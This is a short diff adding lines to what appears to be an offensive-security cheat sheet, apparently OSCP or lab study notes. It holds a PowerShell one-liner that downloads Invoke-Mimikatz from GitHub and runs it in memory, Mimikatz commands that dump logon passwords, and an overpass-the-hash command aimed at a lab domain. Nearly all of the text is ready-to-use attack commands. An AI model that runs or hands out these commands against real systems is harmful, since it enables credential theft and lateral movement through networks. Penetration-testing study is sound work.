@@ -1242,7 +1242,15 @@ Invoke-Mimikatz
 IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1")
 Invoke-Mimikatz
 ```
-
+##### LATERAL MOVEMENT MIMIKATZ - DUMP CREDENTIAL LOCAL MACHINE
+```
+Privilege::debug
+Sekurlsa::logonpasswords
+```
+##### LATERAL MOVEMENT MIMIKATZ - OVER PASS THE HASH
+```
+sekurlsa::pth /user:administrator /domain:doollarcorp.moneycorp.local /ntlm:ntlmhash /run:powershell.exe
+```
 
 
 
